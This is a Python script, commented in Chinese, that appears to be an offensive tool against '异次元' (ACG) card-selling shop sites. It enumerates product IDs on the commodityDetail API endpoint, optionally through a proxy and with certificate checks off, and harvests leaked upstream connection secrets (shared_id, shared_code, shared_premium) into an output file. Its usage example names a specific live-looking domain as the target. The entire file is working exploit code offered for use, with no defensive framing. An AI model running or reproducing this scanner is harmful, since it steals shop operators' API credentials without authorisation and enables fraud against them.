#!/usr/bin/env python3
"""
异次元上游 shared_code 探测 — commodityDetail 泄露对接参数。

示例:
  python3 acg_shared_probe.py -u https://zhanghao9.com --commodity-id 4110
  python3 acg_shared_probe.py -u https://TARGET --scan-range 4000-4500
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, resolve_proxy, save_hit


def fetch_detail(base: str, cid: int, timeout: int, proxy: str) -> dict | None:
    url = base.rstrip("/") + f"/user/api/index/commodityDetail?commodityId={cid}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.get(url, headers={"User-Agent": DEFAULT_UA}, timeout=timeout, proxies=proxies, verify=False)
        data = json_or_text(r)
        if isinstance(data, dict) and data.get("code") == 200:
            inner = data.get("data") or {}
            if inner.get("shared_code") or inner.get("shared_id"):
                return {"id": cid, "name": inner.get("name"), "shared_id": inner.get("shared_id"), "shared_code": inner.get("shared_code"), "shared_premium": inner.get("shared_premium")}
    except Exception:
        pass
    return None


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="ACG shared_code 上游探测")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--commodity-id", type=int, default=0)
    ap.add_argument("--scan-range", default="", help="如 4000-4500")
    ap.add_argument("-w", "--workers", type=int, default=15)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--out", default="/data/tools/faka/out/shared_codes.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)

    if args.commodity_id:
        ids = [args.commodity_id]
    elif args.scan_range and "-" in args.scan_range:
        a, b = args.scan_range.split("-", 1)
        ids = list(range(int(a), int(b) + 1))
    else:
        ids = list(range(1, 101))

    log(f"shared_code probe {args.url} ids={len(ids)}")
    hits = 0

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(fetch_detail, args.url, i, args.timeout, proxy): i for i in ids}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                hits += 1
                save_hit(Path(args.out), "shared_code", res)
                log(f"[+] id={res['id']} code={res.get('shared_code')} premium={res.get('shared_premium')}")

    log(f"完成 hits={hits}")


if __name__ == "__main__":
    main()
